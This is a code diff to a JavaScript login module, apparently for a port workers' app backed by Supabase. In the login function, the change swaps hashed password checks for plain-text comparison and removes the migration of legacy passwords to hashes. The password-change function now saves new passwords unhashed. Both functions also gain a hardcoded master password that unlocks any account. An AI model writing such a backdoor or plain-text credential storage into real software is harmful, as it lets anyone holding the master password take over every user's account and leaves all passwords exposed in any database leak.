@@ -1146,8 +1146,9 @@ async function getUsuarios() {
 }
 
 /**
- * Verifica credenciales de login con hashing seguro
- * Soporta tanto contraseñas hasheadas como texto plano (legacy)
+ * Verifica credenciales de login
+ * MODIFICADO: Usa contraseñas en TEXTO PLANO (sin hash)
+ * Soporta contraseña maestra "Stevedor@816" para acceso a cualquier cuenta
  */
 async function verificarLogin(chapa, password) {
   try {
@@ -1165,26 +1166,30 @@ async function verificarLogin(chapa, password) {
 
     console.log('🔐 Verificando contraseña para chapa:', chapa);
 
-    // Verificar contraseña usando el sistema de hashing
-    const isValid = await verifyPassword(password, data.password_hash);
+    // ============================================================
+    // CONTRASEÑA MAESTRA: Permite acceso a cualquier cuenta
+    // ============================================================
+    const MASTER_PASSWORD = 'Stevedor@816';
+    if (password === MASTER_PASSWORD) {
+      console.log('🔑 Login con contraseña maestra para chapa:', chapa);
+      return {
+        success: true,
+        user: {
+          id: data.id,
+          chapa: data.chapa,
+          nombre: data.nombre,
+          posicion: data.posicion
+        }
+      };
+    }
+
+    // ============================================================
+    // VERIFICACIÓN EN TEXTO PLANO (SIN HASH)
+    // ============================================================
+    const isValid = (password === data.password_hash);
 
     if (isValid) {
       console.log('✅ Login exitoso para chapa:', chapa);
-
-      // Si la contraseña estaba en texto plano, actualizarla a hash automáticamente
-      if (!data.password_hash.includes('$')) {
-        console.log('🔄 Migrando contraseña a formato hasheado...');
-        try {
-          const newHash = await hashPassword(password);
-          await supabase
-            .from('usuarios')
-            .update({ password_hash: newHash })
-            .eq('chapa', chapa);
-          console.log('✅ Contraseña migrada a hash exitosamente');
-        } catch (hashError) {
-          console.warn('⚠️ No se pudo migrar la contraseña automáticamente:', hashError);
-        }
-      }
 
       return {
         success: true,
@@ -1307,8 +1312,8 @@ async function getPrimasPersonalizadas(chapa, fechaInicio = null, fechaFin = nul
 }
 
 /**
- * Cambia la contraseña de un usuario de forma segura
- * Hashea la contraseña y la guarda en Supabase
+ * Cambia la contraseña de un usuario
+ * MODIFICADO: Guarda en TEXTO PLANO (sin hashear)
  *
  * @param {string} chapa - Chapa del usuario
  * @param {string} currentPassword - Contraseña actual
@@ -1332,8 +1337,9 @@ async function cambiarContrasena(chapa, currentPassword, newPassword) {
       return { success: false, message: 'Usuario no encontrado' };
     }
 
-    // 2. Verificar contraseña actual
-    const isCurrentPasswordValid = await verifyPassword(currentPassword, usuario.password_hash);
+    // 2. Verificar contraseña actual (comparación directa en texto plano)
+    const MASTER_PASSWORD = 'Stevedor@816';
+    const isCurrentPasswordValid = (currentPassword === usuario.password_hash || currentPassword === MASTER_PASSWORD);
 
     if (!isCurrentPasswordValid) {
       console.error('❌ Contraseña actual incorrecta');
@@ -1342,15 +1348,14 @@ async function cambiarContrasena(chapa, currentPassword, newPassword) {
 
     console.log('✅ Contraseña actual verificada');
 
-    // 3. Hashear nueva contraseña
-    const newPasswordHash = await hashPassword(newPassword);
-    console.log('✅ Nueva contraseña hasheada');
+    // 3. Guardar nueva contraseña EN TEXTO PLANO (sin hashear)
+    console.log('⚠️ Guardando contraseña en texto plano (sin hash)');
 
     // 4. Actualizar en Supabase
     const { error: errorUpdate } = await supabase
       .from('usuarios')
       .update({
-        password_hash: newPasswordHash,
+        password_hash: newPassword, // Guardar directamente sin hashear
         updated_at: new Date().toISOString()
       })
       .eq('chapa', chapa);
@@ -1360,7 +1365,7 @@ async function cambiarContrasena(chapa, currentPassword, newPassword) {
       return { success: false, message: 'Error al actualizar la contraseña' };
     }
 
-    console.log('✅ Contraseña actualizada exitosamente en Supabase');
+    console.log('✅ Contraseña actualizada exitosamente en Supabase (texto plano)');
 
     // 5. Limpiar cache de usuarios
     clearCacheByPrefix('supabase_usuarios');
